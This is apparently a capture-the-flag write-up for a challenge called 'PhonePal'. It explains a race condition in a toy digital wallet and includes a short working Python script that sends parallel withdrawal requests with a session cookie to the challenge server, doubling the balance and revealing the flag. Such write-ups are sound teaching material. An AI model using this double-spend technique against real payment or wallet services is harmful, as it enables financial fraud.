# PhonePal

Total Solves - 36

Final Points - 281

## Description
I made my own digital wallet. However, I have to give out tokens to attract customers.

## Writeup

On logging in, you see a single page app, with option to withdraw money and add it to wallet. If you try withdrawing, you will notice a small lag. This should be taken as a hint for solving the problem - Race Condition.

The application takes time, to actually change the balance in the database, so if a parallel request is sent to the server at the same time, the balance due to previous request is not yet reduced and both requests go through.

You can send the multiple requests using multiple techniques using Python concurrency, C threading, curl or BurpSuite. For this PoC, I will be using python concurrency.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def send_req(id):
    data = {'amount': 9000}
    cookies = {'session':'eyJzZXNzaW9uX2lkIjoiNjg1YjA3NjMtY2VkMi00YWM4LThiZjMtNDg1NmI0NzUzZTJhIn0.Z5ZUNQ.TV5xrNZDZ1DYpqe-35_5juYgtXM'}
    r = requests.post('http://codefest-ctf.iitbhu.tech:21870/', cookies=cookies, data=data)

MAX_THREADS = 5

ids = [i for i in range(0, 5)]

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    executor.map(send_req, ids)
```

You will see that the wallet balance increased to more than 18000. The flag will be displayed.

## Flag
`CodefestCTF{r4c3_c0nd1t10n_4lw4y5_ftw_[a-zA-Z0-9]{8}}`